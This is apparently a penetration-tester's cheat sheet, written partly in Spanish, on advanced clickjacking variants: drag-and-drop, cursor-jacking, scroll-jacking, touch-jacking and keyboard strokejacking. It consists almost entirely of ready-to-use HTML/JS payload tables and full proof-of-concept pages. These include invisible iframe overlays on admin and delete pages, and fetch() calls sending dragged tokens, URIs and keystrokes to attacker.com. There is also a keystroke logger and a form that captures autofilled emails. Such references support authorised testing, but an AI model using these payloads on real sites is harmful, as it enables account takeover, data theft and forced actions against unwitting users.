---
aliases:
  - Drag-Drop Clickjacking
  - Cursor-Jacking
  - Scroll-Jacking
  - Touch-Jacking
tags:
  - type/technique
  - vuln/clickjacking
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Clickjacking]]'
---
# Clickjacking - Variantes Avanzadas

***

## Drag-and-Drop Clickjacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<div ondragover="event.preventDefault()" ondrop="fetch('//attacker.com/?d='+encodeURIComponent(event.dataTransfer.getData('text')))">Drop here</div>` | Drop event exfil dragged text data | Standard drag-exfil. |
| `<iframe src="https://target.com/profile" style="position:absolute;opacity:0.0001;top:100px;left:100px;width:400px;height:200px"></iframe><div class="target" style="position:absolute;top:100px;left:100px;..." ondrop="captureDrop(event)">Drop here</div>` | Iframe overlay drop capture | Token theft drag. |
| `<a href="https://target.com/secret-token-here" draggable="true">Drag this gold coin</a>` (game UI) | Force drag URL with sensitive token | URL token capture. |
| `<script>document.querySelector('#target').addEventListener('drop',e=>{const t=e.dataTransfer.getData('text/uri-list');fetch('//attacker.com/?u='+encodeURIComponent(t))})</script>` | Capture URI list drop | URI list capture. |
| `<script>document.querySelector('iframe').addEventListener('dragstart',e=>{e.dataTransfer.setData('text', 'attacker_payload')})</script>` | Override drag data setData | Inject manipulation. |
| `<div ondragover="event.preventDefault()" ondrop="fetch('//attacker.com/?d='+encodeURIComponent(JSON.stringify(Array.from(event.dataTransfer.items))))">Drop</div>` | Capture all dataTransfer items | Bulk capture. |
| Mobile: `<div ontouchstart="..." ontouchmove="..." ontouchend="exfil(event)">Drop</div>` (touch drag) | Mobile touch drag | Mobile drag. |
| `<iframe src="https://target.com/account-info" style="opacity:0.0001"></iframe><div ondragover="event.preventDefault()" ondrop="exfilAccountData(event)">Drag account info here for verification</div>` | Drag account info exfil | Account exfil. |
| `<input type="file" ondrop="fileDrop(event)" style="opacity:0;position:absolute">` luego JS read dropped file | File drop API exfil | File drop. |
| `<style>iframe{user-select:text}</style>` con iframe selectable + drag | Force selectable iframe content drag | Selection drag. |
| `<div draggable="true" ondragstart="event.dataTransfer.setData('text','attacker_data')">Drag me into chest</div>` | Reverse direction drag — atacante's data → victim's drop | Reverse drag-and-drop. |
^cj-advanced-dragdrop

### Drag-drop PoC

```html
<!DOCTYPE html>
<html>
<head><style>
  iframe { position: absolute; top: 100px; left: 100px; opacity: 0.001; width: 400px; height: 200px; }
  .target { position: absolute; top: 100px; left: 100px; width: 400px; height: 200px; background: #eee; }
</style></head>
<body>
<h1>Drag the gold coin into the chest!</h1>

<div class="target"
     ondragover="event.preventDefault()"
     ondrop="captureDrop(event)">
  Drop here
</div>

<iframe src="https://target.com/profile"></iframe>

<script>
function captureDrop(e) {
  e.preventDefault();
  const data = e.dataTransfer.getData('text');
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: data
  });
}
</script>
</body>
</html>
```

___

## Cursor-Jacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<style>body{cursor:none}.fake{position:fixed;width:24px;height:24px;background:url('cursor.png');pointer-events:none;z-index:99999}</style><div class="fake" id="c"></div><script>onmousemove=e=>{c.style.left=(e.clientX+100)+'px';c.style.top=(e.clientY+100)+'px'}</script>` | Hide real cursor + show fake at offset | Standard cursor-jacking. |
| `<style>iframe{cursor:none}</style>` + JS render fake cursor offset | Iframe cursor hide + fake offset | iframe-specific. |
| `<canvas id="c"></canvas><script>onmousemove=e=>{c.getContext('2d').clearRect(0,0,500,500);c.getContext('2d').fillRect(e.clientX+100,e.clientY+100,20,20)}</script>` | Canvas dynamic fake cursor | Dynamic canvas. |
| `<style>body{cursor:url('https://attacker.com/cursor.png') 50 50,auto}</style>` con hotspot offset | Cursor image hotspot offset trick | Image hotspot. |
| `<script>document.body.style.cursor='url(data:image/png;base64,AAAA) 100 100, auto'</script>` | Inline data: cursor with hotspot | data: cursor. |
| `<script>document.requestPointerLock()</script>` luego JS controla cursor | Pointer Lock API hijack cursor | Pointer Lock. |
| `<style>iframe{pointer-events:none}.fake-button{pointer-events:auto}</style>` (decoy intercepts) | Disable iframe pointer events for fake UI | Pointer-event swap. |
| `<style>@media (hover:hover){.fake-cursor{display:block}}</style>` (responsive cursor) | Hover-detect responsive fake cursor | Responsive. |
| Mobile: `<style>body{touch-action:none}</style>` + custom touch handlers | Mobile touch-action override | Mobile touch. |
| `<script>onmousemove=e=>{const o=getComputedStyle(document.body).cursor;document.body.style.cursor='none'}</script>` | Force cursor none on movement | Dynamic. |
| `<audio autoplay loop><source src="//attacker.com/instructions.mp3"></audio>` (multi-modal) | Audio "Click button on left" misdirect | Multi-modal cue. |
^cj-advanced-cursorjacking

### Cursor-jacking PoC

```html
<!DOCTYPE html>
<html>
<head><style>
  body { cursor: none; }
  .fake-cursor {
    position: fixed;
    width: 24px; height: 24px;
    background: url('https://example.com/cursor.png');
    pointer-events: none;
    z-index: 99999;
  }
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; }
  .decoy { position: absolute; top: 200px; left: 200px; }
</style></head>
<body>
<div class="fake-cursor" id="cursor"></div>
<iframe src="https://target.com/admin/delete"></iframe>
<button class="decoy">CLICK FOR FREE PRIZE</button>

<script>
const cursor = document.getElementById('cursor');
document.addEventListener('mousemove', (e) => {
  cursor.style.left = (e.clientX + 100) + 'px';
  cursor.style.top = (e.clientY + 100) + 'px';
});
</script>
</body>
</html>
```

___

## Scroll-Jacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe src="https://target.com/long-page#confirm-button" style="opacity:0.0001;..."></iframe>` | Anchor fragment auto-scroll to button | Anchor scroll. |
| `<script>document.querySelector('iframe').contentWindow.scrollTo(0, 800)</script>` (same-origin only) | Force iframe scroll position | Same-origin scroll. |
| `<style>html,body{overflow:hidden}iframe{position:fixed;top:0;left:0;width:100vw;height:100vh}</style>` | Lock parent scroll | UX confusion. |
| `<iframe src="https://target.com/x#button" sandbox="allow-same-origin allow-scripts"></iframe>` | Sandbox + fragment auto-scroll | Sandbox + anchor. |
| `<style>iframe{overflow:hidden;height:50px;width:100%}</style>` (clip iframe to button area) | Clip iframe height to show only target button | Clip-to-button. |
| `<style>iframe{position:absolute;top:-800px;height:1000px}</style>` (negative offset crops top) | Negative offset crop top of iframe | Negative offset. |
| `<style>.container{position:relative;overflow:hidden;height:48px}.container iframe{position:absolute;top:-300px}</style>` | Container clip + iframe overflow | Container clip. |
| `<script>setInterval(()=>window.scrollTo(0,0),50)</script>` (lock parent scroll) | Continuous scroll lock | Aggressive lock. |
| `<style>:root{scroll-behavior:smooth}</style>` + `location.hash='#target'` | Smooth scroll animated to target | Animated scroll. |
| Mobile: `<style>body{position:fixed;overflow:hidden}</style>` | Mobile scroll lock | Mobile lock. |
| `<iframe src="https://target.com/x" scrolling="no"></iframe>` (legacy attr) | Disable iframe scrollbar | Legacy disable. |
| `<style>iframe{transform:scale(2);transform-origin:0 0}</style>` | Zoom iframe to show only button | Zoom-clip. |
^cj-advanced-scrolljacking

___

## Touch-Jacking (Mobile)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe src="https://target.com/admin/x" style="opacity:0.0001;..."></iframe><button ontouchstart="...">TAP TO CLAIM</button>` (mobile UA) | Mobile tap-jacking standard | Standard mobile. |
| `<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">` | Disable pinch-zoom force layout | UX lock. |
| `<style>body{touch-action:none}</style>` (override touch behavior) | touch-action none all gestures | Touch override. |
| `<style>iframe{touch-action:auto}.decoy{touch-action:none}</style>` (selective) | Selective touch-action per element | Granular touch. |
| Mobile WebView test: `adb shell am start -a android.intent.action.VIEW -d "https://attacker.com/cj.html"` | Test in Android WebView | Mobile test. |
| `<button ontouchstart="navigator.vibrate(200)">Tap</button>` (haptic feedback combo) | Haptic distract on tap | Multi-modal. |
| `<style>@media (pointer:coarse){.decoy{display:block}.iframe{opacity:0.0001}}</style>` (touch-only) | Touch-device specific overlay | Touch-device only. |
| `<script>screen.orientation.lock('landscape')</script>` (force orientation) | Force landscape orientation reflow | Reflow. |
| `<button onclick="navigator.credentials.get({webauthn:...})">Confirm</button>` (biometric on tap) | Biometric prompt combo (FIDO/WebAuthn) | Biometric. |
| `<script>window.requestFullscreen()</script>` + mobile fullscreen overlay | Mobile fullscreen overlay | Mobile FS. |
| `<a href="intent://target.com/admin#Intent;...;end">TAP</a>` (Android Intent) | Android Intent deep-link tap | Mobile chain. |
| `<a href="https://target.com/admin/x">tap</a><script>document.querySelector('a').click()</script>` (auto-tap) | Programmatic mobile tap | Auto-tap. |
^cj-advanced-touchjacking

___

## Strokejacking (Keyboard)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<input id="decoy" type="text" autofocus><iframe src="https://target.com/admin/x" style="opacity:0.0001;..."></iframe><script>document.querySelector('iframe').focus()</script>` | Steal focus to iframe input | Focus theft. |
| `<input tabindex="1"><iframe tabindex="0" src="https://target.com/x"></iframe>` (tabindex 0 wins) | tabindex manipulation | Tab order. |
| `<button onclick="document.querySelector('iframe').contentDocument.querySelector('input').focus()">Start typing</button>` (same-origin) | Focus iframe input element | Same-origin focus. |
| `<input autofocus><script>setInterval(()=>document.querySelector('iframe').focus(),100)</script>` | Continuous force iframe focus | Aggressive focus. |
| `<script>document.addEventListener('keydown',e=>{fetch('//attacker.com/k?k='+e.key)})</script>` (parent keylogger) | Keystroke logger en parent | Keystroke log. |
| `<input id="captcha" placeholder="Type ABC123 to continue"><iframe src="https://target.com/x" style="opacity:0.0001"></iframe>` (CAPTCHA decoy) | CAPTCHA UX decoy keystroke redirect | CAPTCHA decoy. |
| `<input id="game-input" placeholder="Type Y to confirm">` (type-jacking decoy) | Type-jacking confirmation UX | Type confirm. |
| `<form action="//attacker.com/log"><input autocomplete="email" autofocus></form>` (force autofill) | Force browser autofill + capture | Autofill combo. |
| `<style>input[type=password]{font-family:'BlankFont'}</style>` (invisible password input) | Hide typed chars decoy | Stealth. |
| Mobile virtual keyboard: `<iframe src="https://target.com/admin/x" inputmode="text"></iframe>` | Mobile virtual keyboard iframe | Mobile keyboard. |
| `<script>document.addEventListener('keydown',e=>{if(e.key==='Tab')document.querySelector('iframe').focus()})</script>` | Tab key redirect to iframe | Tab redirect. |
| `<input dir="rtl"><script>...</script>` (bidirectional script confusion) | RTL text confusion | Bidi edge. |
^cj-advanced-strokejacking

***
